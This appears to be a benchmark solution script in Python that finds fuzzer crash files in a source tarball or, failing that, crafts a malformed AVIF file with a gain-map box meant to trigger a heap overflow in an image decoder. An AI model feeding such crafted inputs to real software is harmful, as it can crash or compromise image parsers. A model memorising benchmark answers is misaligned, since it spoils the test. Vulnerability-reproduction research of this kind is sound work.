import os
import tarfile
import tempfile
import shutil
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    safe_members = []
                    for m in tar.getmembers():
                        name = m.name
                        if not name:
                            continue
                        norm = name.replace("\\", "/")
                        if norm.startswith("/") or ".." in norm.split("/"):
                            continue
                        safe_members.append(m)
                    tar.extractall(tmpdir, members=safe_members)
            except Exception:
                return self._fallback_poc()

            poc = self._find_candidate_poc(tmpdir)
            if poc is not None:
                return poc

            return self._fallback_poc()
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def _find_candidate_poc(self, root: str):
        patterns = [
            "poc",
            "proof",
            "clusterfuzz",
            "crash",
            "gainmap",
            "gain_map",
            "gm",
            "overflow",
            "heap",
            "42535447",
            "decodegainmap",
        ]
        preferred_exts = [
            ".avif",
            ".heic",
            ".heif",
            ".jxl",
            ".bin",
            ".raw",
            ".dat",
            ".img",
            "",
        ]
        best_data = None
        best_score = None
        max_size = 4096

        for dirpath, _, filenames in os.walk(root):
            for filename in filenames:
                lower = filename.lower()
                if not any(pat in lower for pat in patterns):
                    continue
                path = os.path.join(dirpath, filename)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size <= 0 or size > max_size:
                    continue

                ext_score = 1.0
                for idx, ext in enumerate(preferred_exts):
                    if ext and lower.endswith(ext):
                        ext_score = 0.5 + 0.1 * (len(preferred_exts) - idx)
                        break

                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except OSError:
                    continue

                score = len(data) * ext_score
                if best_score is None or score < best_score:
                    best_score = score
                    best_data = data

        return best_data

    def _fallback_poc(self) -> bytes:
        def make_box(box_type: bytes, payload: bytes) -> bytes:
            size = 8 + len(payload)
            return struct.pack(">I4s", size, box_type) + payload

        parts = []

        ftyp_payload = b"avif" + b"\x00\x00\x00\x00" + b"avif" + b"mif1"
        parts.append(make_box(b"ftyp", ftyp_payload))

        hdrgm_payload = b"\x00\x00\x00\x01" * 5
        hdrgm_box = make_box(b"hdgm", hdrgm_payload)

        meta_payload = b"\x00\x00\x00\x00" + hdrgm_box
        parts.append(make_box(b"meta", meta_payload))

        data = b"".join(parts)

        target_len = 133
        if len(data) < target_len:
            data += b"\x00" * (target_len - len(data))
        else:
            data = data[:target_len]

        return data